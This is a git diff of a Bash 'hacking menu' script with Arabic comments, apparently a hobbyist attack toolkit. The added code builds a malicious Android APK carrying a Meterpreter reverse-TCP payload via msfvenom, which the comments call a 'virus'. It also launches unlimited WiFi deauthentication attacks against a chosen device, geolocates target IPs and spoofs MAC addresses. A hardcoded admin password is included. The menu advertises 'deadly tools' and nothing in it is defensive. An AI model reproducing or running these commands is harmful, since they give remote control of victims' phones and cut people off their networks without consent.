@@ -1,14 +1,15 @@
 #!/bin/bash
-# xxszmsx PRO | BY: STUDIO | 15 ACTIVE TOOLS
+# xxszmsx TOP 10 | BY: STUDIO
 RED='\e[1;31m'; GREEN='\e[1;32m'; NC='\e[0m'
 
-# لوحة الأدمن بكلمة السر (خيار 11)
-admin_panel() {
-    read -s -p "[?] Enter Password: " apass; echo ""
-    if [ "$apass" == "mazen2014" ]; then
-        echo -e "${GREEN}Welcome Master Mazen${NC}"; nano xxszmsx.sh
+# لوحة الأدمن (مخصصة لك بكلمة السر)
+admin_access() {
+    read -s -p "[?] Enter Admin Password: " p; echo ""
+    if [ "$p" == "mazen2014" ]; then
+        echo -e "${GREEN}Welcome Master Mazen. Opening Editor...${NC}"
+        nano xxszmsx.sh
     else
-        echo -e "${RED}Wrong Password!${NC}"; sleep 2
+        echo -e "${RED}Unauthorized Access!${NC}"; sleep 2
     fi
 }
 
@@ -21,33 +22,30 @@ while true; do
     echo "██╔╝ ██╗██╔╝ ██╗███████║███████║██║ ╚═╝ ██║██╔╝ ██╗"
     echo -e "╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝${NC}"
     echo "-----------------------------------------------------"
-    echo "   [!] 15 FULLY ACTIVE TOOLS | POWERED BY: STUDIO    "
+    echo "   [!] TOP 10 DEADLY TOOLS | POWERED BY: STUDIO      "
     echo "-----------------------------------------------------"
-    echo -e "1) Build Android Hacker (.apk)  9) Email Leak Finder"
-    echo "2) IP Precise Tracker (Map)     10) Router Vulnerability"
-    echo "3) WiFi Monitor Mode (Start)    11) [!] ADMIN CONTROL [!]"
-    echo "4) WiFi Deauth Attack           12) Fake Caller Spoof"
-    echo "5) MAC Address Changer          13) Social Media Hunt"
-    echo "6) Nmap Port Scanner            14) Web Shell Injector"
-    echo "7) SQL Injection Scan           15) Brute Force Pass"
-    echo "8) Phone Info Lookup            0) Exit"
+    echo -e "1) Build Android Hacker (.apk)  6) SQL Injection Scanner"
+    echo -e "2) Precise IP & Map Tracker     7) Social Media Hunt"
+    echo -e "3) WiFi Monitor Mode (Start)    8) Phone Info Lookup"
+    echo -e "4) WiFi Deauth (Disconnect)     9) [!] ADMIN PANEL [!]"
+    echo -e "5) MAC Address Randomizer       10) UPDATE & CLEAN"
     echo "-----------------------------------------------------"
+    echo "0) Exit"
     read -p "Studio >> " choice
 
     case $choice in
-        1) # صنع ملف الهكر
-           read -p "LHOST (Your IP): " lh; read -p "LPORT: " lp
+        1) # صنع الفيروس
+           read -p "Your IP (LHOST): " lh; read -p "Port: " lp
+           echo -e "${RED}[*] Creating mazen_hacker.apk...${NC}"
            msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp R > mazen_hacker.apk
-           echo -e "${GREEN}[+] Created: mazen_hacker.apk${NC}" ;;
-        2) # تتبع دقيق
-           read -p "Target IP: " tip
-           curl -s "http://ip-api.com/json/$tip?fields=status,country,regionName,city,zip,lat,lon,isp,query" ;;
+           echo -e "${GREEN}[+] Done! Find mazen_hacker.apk in folder.${NC}" ;;
+        2) # تتبع IP
+           read -p "IP: " tip; curl -s "http://ip-api.com/json/$tip?fields=status,country,regionName,city,zip,lat,lon,isp,query" ;;
         3) sudo airmon-ng start wlan0 ;;
-        5) read -p "Interface (wlan0/eth0): " iface; sudo macchanger -r $iface ;;
-        6) read -p "Target IP: " tip; nmap -sV $tip ;;
-        11) admin_panel ;;
-        15) # مثال لفتح أداة حقيقية
-           hydra -h ;;
+        4) read -p "Target MAC: " tmac; read -p "Gateway MAC: " gmac; sudo aireplay-ng --deauth 0 -a $gmac -c $tmac wlan0mon ;;
+        5) read -p "Interface (eth0/wlan0): " iface; sudo macchanger -r $iface ;;
+        9) admin_access ;;
+        10) git pull origin main; echo -e "${GREEN}Updated!${NC}"; sleep 1 ;;
         0) exit 0 ;;
     esac
     echo -e "\n${RED}[+] Press Enter to Continue...${NC}"; read
